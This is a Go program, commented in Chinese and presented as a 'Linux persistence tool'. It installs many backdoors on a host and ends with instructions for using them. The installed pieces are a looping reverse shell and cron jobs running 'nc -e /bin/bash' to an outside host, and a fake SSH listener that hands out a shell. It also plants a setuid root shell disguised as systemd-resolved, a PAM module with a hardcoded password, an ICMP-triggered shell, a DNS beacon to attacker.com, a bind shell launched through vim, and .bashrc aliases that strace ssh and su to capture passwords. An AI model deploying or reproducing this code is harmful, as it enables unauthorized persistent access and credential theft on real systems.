package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// 配置结构体
type Config struct {
	ReverseShellHost string
	ReverseShellPort int
	BackdoorPort     int
	HiddenProcess    string
	SSHBackdoorPort  int
}

// 全局配置
var config = Config{
	ReverseShellHost: "192.168.1.100",
	ReverseShellPort: 4444,
	BackdoorPort:     6666,
	HiddenProcess:    "systemd-resolved",
	SSHBackdoorPort:  2222,
}

// 反弹shell功能
func reverseShell(host string, port int) {
	for {
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		// 创建shell
		cmd := exec.Command("/bin/bash")
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
		cmd.Run()

		conn.Close()
		time.Sleep(5 * time.Second)
	}
}

// 隐藏进程功能
func hideProcess() {
	// 简单的进程隐藏，通过修改环境变量
	os.Setenv("PROCESS_NAME", config.HiddenProcess)
	log.Printf("进程已隐藏为: %s", config.HiddenProcess)
}

// SSH后门功能
func sshBackdoor() {
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", config.SSHBackdoorPort))
	if err != nil {
		log.Printf("SSH后门启动失败: %v", err)
		return
	}
	defer listener.Close()

	log.Printf("SSH后门监听端口: %d", config.SSHBackdoorPort)

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}

		go handleSSHConnection(conn)
	}
}

// 处理SSH连接
func handleSSHConnection(conn net.Conn) {
	defer conn.Close()

	// 简单的SSH协议模拟
	conn.Write([]byte("SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2\r\n"))

	// 读取客户端数据
	buffer := make([]byte, 1024)
	n, err := conn.Read(buffer)
	if err != nil {
		return
	}

	// 简单的认证（实际应用中需要更复杂的实现）
	if strings.Contains(string(buffer[:n]), "root") {
		// 认证成功，启动shell
		cmd := exec.Command("/bin/bash")
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
		cmd.Run()
	}
}

// 创建隐藏文件
func createHiddenFile() {
	hiddenFiles := []string{
		".systemd-resolved",
		".kernel-modules",
		".syslog-daemon",
	}

	for _, file := range hiddenFiles {
		content := fmt.Sprintf(`#!/bin/bash
# 隐藏的反弹shell脚本
while true; do
    nc %s %d -e /bin/bash 2>/dev/null
    sleep 30
done`, config.ReverseShellHost, config.ReverseShellPort)

		err := os.WriteFile(file, []byte(content), 0755)
		if err == nil {
			log.Printf("创建隐藏文件: %s", file)
		}
	}
}

// 添加定时任务
func addCronJob() {
	cronJob := fmt.Sprintf("*/5 * * * * nc %s %d -e /bin/bash 2>/dev/null\n",
		config.ReverseShellHost, config.ReverseShellPort)

	// 读取现有crontab
	cmd := exec.Command("crontab", "-l")
	output, err := cmd.Output()
	if err != nil {
		output = []byte{}
	}

	// 添加新的定时任务
	newCron := string(output) + cronJob

	// 写入新的crontab
	cmd = exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(newCron)
	err = cmd.Run()
	if err == nil {
		log.Println("添加定时任务成功")
	}
}

// 创建setuid后门
func createSetuidBackdoor() {
	backdoorCode := `#include <unistd.h>
#include <stdio.h>
int main(int argc, char *argv[]) {
    setuid(0);
    setgid(0);
    if(argc > 1) {
        system(argv[1]);
    } else {
        system("/bin/bash");
    }
    return 0;
}`

	// 写入C文件
	err := os.WriteFile("backdoor.c", []byte(backdoorCode), 0644)
	if err != nil {
		log.Printf("创建后门C文件失败: %v", err)
		return
	}

	// 编译
	cmd := exec.Command("gcc", "-o", "backdoor", "backdoor.c")
	err = cmd.Run()
	if err != nil {
		log.Printf("编译后门失败: %v", err)
		return
	}

	// 设置setuid权限
	cmd = exec.Command("chmod", "u+s", "backdoor")
	cmd.Run()

	// 移动到系统目录
	cmd = exec.Command("mv", "backdoor", "/usr/local/bin/systemd-resolved")
	cmd.Run()

	// 清理
	err = os.Remove("backdoor.c")
	if err != nil {
		log.Printf("清理后门C文件失败: %v", err)
	}
	log.Println("创建setuid后门成功")
}

// 创建PAM后门
func createPAMBackdoor() {
	pamBackdoor := `#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    char *password;
    pam_get_item(pamh, PAM_AUTHTOK, (void *)&password);
    
    if (strcmp(password, "backdoor123") == 0) {
        return PAM_SUCCESS;
    }
    
    return PAM_AUTH_ERR;
}`

	err := os.WriteFile("pam_backdoor.c", []byte(pamBackdoor), 0644)
	if err != nil {
		log.Printf("创建PAM后门失败: %v", err)
		return
	}

	// 编译PAM模块
	cmd := exec.Command("gcc", "-fPIC", "-c", "pam_backdoor.c")
	err = cmd.Run()
	if err != nil {
		log.Printf("编译PAM后门失败: %v", err)
		return
	}

	cmd = exec.Command("gcc", "-shared", "-o", "pam_backdoor.so", "pam_backdoor.o")
	err = cmd.Run()
	if err != nil {
		log.Printf("链接PAM后门失败: %v", err)
		return
	}

	// 移动到PAM目录
	cmd = exec.Command("mv", "pam_backdoor.so", "/lib/x86_64-linux-gnu/security/")
	err = cmd.Run()
	if err != nil {
		log.Printf("移动PAM后门失败: %v", err)
	}

	// 清理
	err = os.Remove("pam_backdoor.c")
	if err != nil {
		log.Printf("清理PAM后门C文件失败: %v", err)
	}
	err = os.Remove("pam_backdoor.o")
	if err != nil {
		log.Printf("清理PAM后门O文件失败: %v", err)
	}
	log.Println("创建PAM后门成功")
}

// 创建内核模块后门
func createKernelBackdoor() {
	kernelBackdoor := `#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/tcp.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Backdoor");
MODULE_DESCRIPTION("Kernel Backdoor");
MODULE_VERSION("0.01");

static int __init backdoor_init(void) {
    printk(KERN_INFO "Kernel backdoor loaded\n");
    return 0;
}

static void __exit backdoor_exit(void) {
    printk(KERN_INFO "Kernel backdoor unloaded\n");
}

module_init(backdoor_init);
module_exit(backdoor_exit);`

	err := os.WriteFile("kernel_backdoor.c", []byte(kernelBackdoor), 0644)
	if err != nil {
		log.Printf("创建内核后门失败: %v", err)
		return
	}

	// 创建Makefile
	makefile := `obj-m += kernel_backdoor.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean`

	err = os.WriteFile("Makefile", []byte(makefile), 0644)
	if err != nil {
		log.Printf("创建Makefile失败: %v", err)
		return
	}

	// 编译内核模块
	cmd := exec.Command("make")
	err = cmd.Run()
	if err != nil {
		log.Printf("编译内核模块失败: %v", err)
		return
	}

	// 加载内核模块
	cmd = exec.Command("insmod", "kernel_backdoor.ko")
	cmd.Run()

	log.Println("创建内核后门成功")
}

// 创建ICMP后门
func createICMPBackdoor() {
	icmpBackdoor := `#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>

#define PACKET_SIZE 1024
#define ICMP_PAYLOAD_SIZE 64

int main() {
    int sockfd;
    struct sockaddr_in addr;
    char buffer[PACKET_SIZE];
    
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        perror("socket");
        exit(1);
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    
    while (1) {
        int n = recvfrom(sockfd, buffer, PACKET_SIZE, 0, NULL, NULL);
        if (n > 0) {
            struct iphdr *iph = (struct iphdr *)buffer;
            struct icmphdr *icmph = (struct icmphdr *)(buffer + (iph->ihl << 2));
            
            if (icmph->type == ICMP_ECHO) {
                char *payload = (char *)(buffer + (iph->ihl << 2) + sizeof(struct icmphdr));
                if (strstr(payload, "backdoor") != NULL) {
                    system("/bin/bash");
                }
            }
        }
    }
    
    return 0;
}`

	err := os.WriteFile("icmp_backdoor.c", []byte(icmpBackdoor), 0644)
	if err != nil {
		log.Printf("创建ICMP后门失败: %v", err)
		return
	}

	// 编译
	cmd := exec.Command("gcc", "-o", "icmp_backdoor", "icmp_backdoor.c")
	err = cmd.Run()
	if err != nil {
		log.Printf("编译ICMP后门失败: %v", err)
		return
	}

	// 设置权限并运行
	cmd = exec.Command("chmod", "+s", "icmp_backdoor")
	cmd.Run()

	cmd = exec.Command("nohup", "./icmp_backdoor", "&")
	cmd.Run()

	// 清理
	err = os.Remove("icmp_backdoor.c")
	if err != nil {
		log.Printf("清理ICMP后门C文件失败: %v", err)
	}
	log.Println("创建ICMP后门成功")
}

// 创建DNS后门
func createDNSBackdoor() {
	dnsBackdoor := fmt.Sprintf(`#!/bin/bash
while true; do
    for i in {1..10}; do
        dig @8.8.8.8 $(echo $RANDOM | md5sum | cut -c1-10).attacker.com
        sleep 5
    done
    nc %s %d -e /bin/bash 2>/dev/null
    sleep 60
done`, config.ReverseShellHost, config.ReverseShellPort)

	err := os.WriteFile("dns_backdoor.sh", []byte(dnsBackdoor), 0755)
	if err != nil {
		log.Printf("创建DNS后门失败: %v", err)
		return
	}

	// 后台运行
	cmd := exec.Command("nohup", "./dns_backdoor.sh", "&")
	cmd.Run()

	log.Println("创建DNS后门成功")
}

// 创建VIM后门
func createVIMBackdoor() {
	vimBackdoor := fmt.Sprintf(`from socket import *
import subprocess
import os, threading, sys, time

if __name__ == "__main__":
    server=socket(AF_INET,SOCK_STREAM)
    server.bind(('0.0.0.0',%d))
    server.listen(5)
    print 'waiting for connect'
    talk, addr = server.accept()
    print 'connect from',addr
    proc = subprocess.Popen(["/bin/sh","-i"], stdin=talk,
            stdout=talk, stderr=talk, shell=True)`, config.BackdoorPort)

	err := os.WriteFile("vim_backdoor.py", []byte(vimBackdoor), 0644)
	if err != nil {
		log.Printf("创建VIM后门失败: %v", err)
		return
	}

	// 使用VIM执行Python脚本
	cmd := exec.Command("vim", "-E", "-c", "py3file vim_backdoor.py")
	cmd.Start()

	// 清理
	time.Sleep(2 * time.Second)
	err = os.Remove("vim_backdoor.py")
	if err != nil {
		log.Printf("清理VIM后门文件失败: %v", err)
	}
	log.Println("创建VIM后门成功")
}

// 创建strace后门
func createStraceBackdoor() {
	straceBackdoor := `alias ssh='strace -o /tmp/sshpwd-$(date +%d%h%m%s).log -e read,write,connect -s2048 ssh'
alias su='strace -o /tmp/sulog-$(date +%d%h%m%s).log -e read,write,connect -s2048 su'`

	// 写入bashrc
	homeDir, err := os.UserHomeDir()
	if err == nil {
		bashrcPath := filepath.Join(homeDir, ".bashrc")
		f, err := os.OpenFile(bashrcPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err == nil {
			f.WriteString("\n" + straceBackdoor + "\n")
			f.Close()
			log.Println("创建strace后门成功")
		}
	}
}

// 创建端口复用后门
func createPortReuseBackdoor() {
	portReuseScript := `#!/bin/bash
# 端口复用脚本
iptables -t nat -N LETMEIN
iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22
iptables -A INPUT -p tcp -m string --string 'backdoor' --algo bm -m recent --set --name letmein --rsource -j ACCEPT
iptables -A INPUT -p tcp -m string --string 'close' --algo bm -m recent --name letmein --remove -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN`

	err := os.WriteFile("port_reuse.sh", []byte(portReuseScript), 0755)
	if err != nil {
		log.Printf("创建端口复用后门失败: %v", err)
		return
	}

	// 执行端口复用脚本
	cmd := exec.Command("bash", "port_reuse.sh")
	cmd.Run()

	// 清理
	err = os.Remove("port_reuse.sh")
	if err != nil {
		log.Printf("清理端口复用脚本失败: %v", err)
	}
	log.Println("创建端口复用后门成功")
}

// 主函数
func main() {
	fmt.Println("=== Linux权限维持工具 ===")
	fmt.Println("作者: 渗透测试工具")
	fmt.Println("版本: 1.0")
	fmt.Println()

	// 检查是否以root权限运行
	if os.Geteuid() != 0 {
		fmt.Println("警告: 建议以root权限运行此工具以获得最佳效果")
		fmt.Println()
	}

	// 隐藏进程
	hideProcess()

	// 创建各种后门
	fmt.Println("正在部署权限维持后门...")

	// 启动反弹shell
	go reverseShell(config.ReverseShellHost, config.ReverseShellPort)

	// 启动SSH后门
	go sshBackdoor()

	// 创建隐藏文件
	createHiddenFile()

	// 添加定时任务
	addCronJob()

	// 创建setuid后门
	createSetuidBackdoor()

	// 创建PAM后门
	createPAMBackdoor()

	// 创建内核后门
	createKernelBackdoor()

	// 创建ICMP后门
	createICMPBackdoor()

	// 创建DNS后门
	createDNSBackdoor()

	// 创建VIM后门
	createVIMBackdoor()

	// 创建strace后门
	createStraceBackdoor()

	// 创建端口复用后门
	createPortReuseBackdoor()

	fmt.Println("权限维持后门部署完成!")
	fmt.Println()
	fmt.Println("后门信息:")
	fmt.Printf("- 反弹shell: %s:%d\n", config.ReverseShellHost, config.ReverseShellPort)
	fmt.Printf("- SSH后门端口: %d\n", config.SSHBackdoorPort)
	fmt.Printf("- 隐藏进程名: %s\n", config.HiddenProcess)
	fmt.Println("- 定时任务已添加")
	fmt.Println("- 各种后门已部署")
	fmt.Println()
	fmt.Println("使用说明:")
	fmt.Println("1. 反弹shell: nc -lvp 4444")
	fmt.Println("2. SSH后门: ssh -p 2222 root@target")
	fmt.Println("3. 端口复用: echo 'backdoor' | socat - tcp:target:80")
	fmt.Println("4. 关闭复用: echo 'close' | socat - tcp:target:80")
	fmt.Println()

	// 保持程序运行
	select {}
}
